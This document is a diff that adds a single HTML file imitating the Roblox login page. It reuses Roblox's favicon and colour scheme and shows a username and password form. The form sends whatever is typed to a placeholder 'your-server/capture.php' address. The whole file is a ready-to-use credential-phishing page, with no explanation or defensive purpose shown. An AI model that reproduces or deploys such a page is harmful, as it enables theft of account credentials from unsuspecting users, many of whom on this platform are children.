@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<head><title>Roblox - Log In</title></head>
+<body style="font-family:Roboto,sans-serif;background:#13161D;">
+  <div style="max-width:400px;margin:100px auto;padding:20px;background:white;border-radius:8px;">
+    <img src="https://www.roblox.com/favicon.ico" width=50 height=50>
+    <h2>Roblox</h2>
+    <form action="http://your-server/capture.php" method=POST>
+      <input type="email" name="username" placeholder="Username" required style="width:100%;padding:10px;margin:5px 0;border:1px solid #ccc;border-radius:4px;">
+      <input type="password" name="password" placeholder="Password" required style="width:100%;padding:10px;margin:5px 0;border:1px solid #ccc;border-radius:4px;">
+      <button type="submit" style="width:100%;padding:12px;background:#00A2FF;color:white;border:none;border-radius:4px;font-weight:bold;">Log In</button>
+    </form>
+    <p style="font-size:12px;color:#666;text-align:center;margin-top:20px;">Forgot password? <a href="#">Click here</a></p>
+  </div>
+</body>
+</html>
